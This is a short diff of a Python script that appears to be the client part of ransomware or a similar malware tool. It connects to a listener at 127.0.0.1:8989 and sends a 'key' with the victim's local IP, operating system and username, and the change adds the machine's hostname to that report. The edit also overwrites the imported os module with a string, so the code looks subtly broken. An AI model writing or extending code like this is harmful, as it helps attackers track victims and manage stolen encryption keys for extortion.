@@ -4,9 +4,10 @@ import os, sys, socket, string, random, hashlib, getpass, platform, threading, d
 host = '127.0.0.1'
 port = 8989
 
-global platform
-platform = platform.system()
-#platform = "Windows"
+global os
+global name
+os = platform.system()
+hostname = platform.node()
 
 def getlocalip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -23,7 +24,7 @@ def connector():
     try:
         # Send Key
         server.connect((host, port))
-        message = '%s$%s$%s$%s' % (getlocalip(), platform, key, getpass.getuser())
+        message = '%s$%s$%s$%s$%s' % (getlocalip(), os, key, getpass.getuser(), hostname)
         server.send(message.encode('utf-8'))
         print("Message sent: %s" % (message))
 
